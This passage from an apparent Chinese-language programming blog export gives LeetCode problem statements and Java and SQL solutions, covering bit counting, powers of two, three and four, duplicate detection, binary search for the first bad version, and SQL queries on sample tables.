<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：使用库函数"><a href="#解法一：使用库函数" class="headerlink" title="解法一：使用库函数"></a>解法一：使用库函数</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">// you need to treat n as an unsigned value</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.bitCount(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二：使用布赖恩·克尼根位计数算法"><a href="#解法二：使用布赖恩·克尼根位计数算法" class="headerlink" title="解法二：使用布赖恩·克尼根位计数算法"></a>解法二：使用<a href="https://www.techiedelight.com/brian-kernighans-algorithm-count-set-bits-integer/" target="_blank" rel="noopener">布赖恩·克尼根位计数算法</a></h4><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0</span> != n) &#123;</span><br><span class="line">        	n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">        	count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：移位-超时"><a href="#解法三：移位-超时" class="headerlink" title="解法三：移位(超时)"></a>解法三：移位(超时)</h3><h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">int</span> distance = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">	      <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">	        distance += <span class="number">1</span>;</span><br><span class="line">	      n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> distance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>196. 删除重复的电子邮箱</title>
    <url>/2018/08/30/LeetCode/leetcode-000196.%20%E5%88%A0%E9%99%A4%E9%87%8D%E5%A4%8D%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个 SQL 查询，来删除 <code>Person</code> 表中所有重复的电子邮箱，重复的邮箱里只保留 Id 最小 的那个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------------+</span><br><span class="line">| Id | Email            |</span><br><span class="line">+----+------------------+</span><br><span class="line">| 1  | john@example.com |</span><br><span class="line">| 2  | bob@example.com  |</span><br><span class="line">| 3  | john@example.com |</span><br><span class="line">+----+------------------+</span><br><span class="line">Id 是这个表的主键。</span><br></pre></td></tr></table></figure>

<p>例如，在运行你的查询语句之后，上面的 <code>Person</code> 表应返回以下几行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------------+</span><br><span class="line">| Id | Email            |</span><br><span class="line">+----+------------------+</span><br><span class="line">| 1  | john@example.com |</span><br><span class="line">| 2  | bob@example.com  |</span><br><span class="line">+----+------------------+</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>无</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">DELETE</span> p1 <span class="keyword">FROM</span> Person p1, Person p2 <span class="keyword">WHERE</span> p1.Email = p2.Email <span class="keyword">AND</span> p1.Id &gt; p2.Id</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>231. 2的幂</title>
    <url>/2018/08/30/LeetCode/leetcode-000231.%202%E7%9A%84%E5%B9%82/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 1</span><br><span class="line">输出: true</span><br><span class="line">解释: 20 &#x3D; 1</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 16</span><br><span class="line">输出: true</span><br><span class="line">解释: 24 &#x3D; 16</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 218</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>2的幂次数值转换为二进制之后，只有一个1，统计每个数字二进制的1的个数就行。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String s = Integer.toBinaryString(n);</span><br><span class="line">        <span class="keyword">long</span> count = s.chars().filter(c -&gt; <span class="string">'1'</span> == c).count();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> == count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>统计数值里面1的个数，2的幂的话，1肯定在最高位，并且只有一个。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>217. 存在重复元素</title>
    <url>/2018/08/30/LeetCode/leetcode-000217.%20%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组，判断是否存在重复元素。</p>
<p>如果任何值在数组中出现至少两次，函数返回 true。如果数组中每个元素都不相同，则返回 false。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3,1]</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3,4]</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,1,1,3,3,4,3,2,4,2]</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>排序完之后，比较相邻两个元素是否一样即可。是的话，则返回true，否则返回false。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (;i &lt; nums.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (nums[i] == nums[i + <span class="number">1</span>]) &#123;</span><br><span class="line">        		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：借助HashSet"><a href="#解法二：借助HashSet" class="headerlink" title="解法二：借助HashSet"></a>解法二：借助HashSet</h3><p>遍历数组，对于每个num，如果在set中已经存在了，表示已经出现过，则数组存在重复，否则加入set。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">			<span class="keyword">if</span> (set.contains(num)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			set.add(num);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：暴力破解"><a href="#解法三：暴力破解" class="headerlink" title="解法三：暴力破解"></a>解法三：暴力破解</h3><p>此方法会超时</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (nums[i] == nums[j]) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>278. 第一个错误的版本</title>
    <url>/2018/08/30/LeetCode/leetcode-000278.%20%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF%E7%9A%84%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。</p>
<p>假设你有 <code>n</code> 个版本 <code>[1, 2, ..., n]</code>，你想找出导致之后所有版本出错的第一个错误的版本。</p>
<p>你可以通过调用 <code>bool isBadVersion(version)</code> 接口来判断版本号 <code>version</code> 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 n &#x3D; 5，并且 version &#x3D; 4 是第一个错误的版本。</span><br><span class="line"></span><br><span class="line">调用 isBadVersion(3) -&gt; false</span><br><span class="line">调用 isBadVersion(5) -&gt; true</span><br><span class="line">调用 isBadVersion(4) -&gt; true</span><br><span class="line"></span><br><span class="line">所以，4 是第一个错误的版本。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：二分查找"><a href="#解法一：二分查找" class="headerlink" title="解法一：二分查找"></a>解法一：二分查找</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> end = n;</span><br><span class="line">        <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(begin &lt;= end) &#123;</span><br><span class="line">            mid = begin + (end - begin) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (isBadVersion(mid)) &#123;</span><br><span class="line">                end = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                begin = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> begin;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>BinarySearch</tag>
      </tags>
  </entry>
  <entry>
    <title>184. 部门工资最高的员工</title>
    <url>/2018/08/30/LeetCode/leetcode-000184.%20%E9%83%A8%E9%97%A8%E5%B7%A5%E8%B5%84%E6%9C%80%E9%AB%98%E7%9A%84%E5%91%98%E5%B7%A5/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><code>Employee</code> 表包含所有员工信息，每个员工有其对应的 Id, salary 和 department Id。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+--------+--------------+</span><br><span class="line">| Id | Name  | Salary | DepartmentId |</span><br><span class="line">+----+-------+--------+--------------+</span><br><span class="line">| 1  | Joe   | 70000  | 1            |</span><br><span class="line">| 2  | Henry | 80000  | 2            |</span><br><span class="line">| 3  | Sam   | 60000  | 2            |</span><br><span class="line">| 4  | Max   | 90000  | 1            |</span><br><span class="line">+----+-------+--------+--------------+</span><br></pre></td></tr></table></figure>
<p><code>Department</code> 表包含公司所有部门的信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+----------+</span><br><span class="line">| Id | Name     |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | IT       |</span><br><span class="line">| 2  | Sales    |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure>
<p>编写一个 SQL 查询，找出每个部门工资最高的员工。例如，根据上述给定的表格，Max 在 IT 部门有最高工资，Henry 在 Sales 部门有最高工资。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------+----------+--------+</span><br><span class="line">| Department | Employee | Salary |</span><br><span class="line">+------------+----------+--------+</span><br><span class="line">| IT         | Max      | 90000  |</span><br><span class="line">| Sales      | Henry    | 80000  |</span><br><span class="line">+------------+----------+--------+</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> Department.Name <span class="keyword">as</span> Department,Employee.Name <span class="keyword">as</span> Employee,Salary <span class="keyword">from</span> Employee,Department <span class="keyword">where</span> Employee.DepartmentId = Department.Id <span class="keyword">and</span> Salary = (<span class="keyword">select</span> <span class="keyword">max</span>(Salary) <span class="keyword">from</span> Employee <span class="keyword">where</span> Employee.DepartmentId = Department.Id) <span class="keyword">order</span> <span class="keyword">by</span> Department.Id <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>342. 4的幂</title>
    <url>/2018/08/30/LeetCode/leetcode-000342.%204%E7%9A%84%E5%B9%82/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数 (32 位有符号整数)，请编写一个函数来判断它是否是 4 的幂次方。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 16</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><p>你能不使用循环或者递归来完成本题吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用对数</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfFour</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> logAns = Math.log10(num) / Math.log10(<span class="number">4</span>);</span><br><span class="line">	    <span class="keyword">return</span> (logAns - (<span class="keyword">int</span>)logAns == <span class="number">0</span>) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>345. 反转字符串中的元音字母</title>
    <url>/2018/08/30/LeetCode/leetcode-000345.%20%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%85%83%E9%9F%B3%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，以字符串作为输入，反转该字符串中的元音字母。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;hello&quot;</span><br><span class="line">输出: &quot;holle&quot;</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;leetcode&quot;</span><br><span class="line">输出: &quot;leotcede&quot;</span><br></pre></td></tr></table></figure>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><p>元音字母不包含字母”y”。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>忘记了</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseVowels</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Set&lt;Character&gt; cSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        cSet.add(<span class="string">'A'</span>);</span><br><span class="line">        cSet.add(<span class="string">'E'</span>);</span><br><span class="line">        cSet.add(<span class="string">'I'</span>);</span><br><span class="line">        cSet.add(<span class="string">'O'</span>);</span><br><span class="line">        cSet.add(<span class="string">'U'</span>);</span><br><span class="line">        cSet.add(<span class="string">'a'</span>);</span><br><span class="line">        cSet.add(<span class="string">'e'</span>);</span><br><span class="line">        cSet.add(<span class="string">'i'</span>);</span><br><span class="line">        cSet.add(<span class="string">'o'</span>);</span><br><span class="line">        cSet.add(<span class="string">'u'</span>);</span><br><span class="line">        </span><br><span class="line">        List&lt;Character&gt; values = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">        	<span class="keyword">if</span> (cSet.contains(c)) &#123;</span><br><span class="line">        		values.add(c);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> index = values.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">        	<span class="keyword">if</span> (cSet.contains(c)) &#123;</span><br><span class="line">        		sb.append(values.get(index--));</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		sb.append(c);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>326. 3的幂</title>
    <url>/2018/08/30/LeetCode/leetcode-000326.%203%E7%9A%84%E5%B9%82/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数，写一个函数来判断它是否是 3 的幂次方。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 27</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 0</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 9</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 45</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>你能不使用循环或者递归来完成本题吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归"><a href="#解法一：递归" class="headerlink" title="解法一：递归"></a>解法一：递归</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> isPowerOfThree(n / <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：循环"><a href="#解法二：循环" class="headerlink" title="解法二：循环"></a>解法二：循环</h3><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (n &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (n % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            n /= <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：数学方法"><a href="#解法三：数学方法" class="headerlink" title="解法三：数学方法"></a>解法三：数学方法</h3><p><img src="https://huhansi.github.io/images/2020-3demi.png" alt="数学公式"></p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Math.log10(n) / Math.log10(<span class="number">3</span>)) % <span class="number">1</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h3><p>使用库函数，转换成3进制的数的字符串，然后判断字符串是否只包含一个1.</p>
<h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.toString(n, <span class="number">3</span>).matches(<span class="string">"^10*$"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

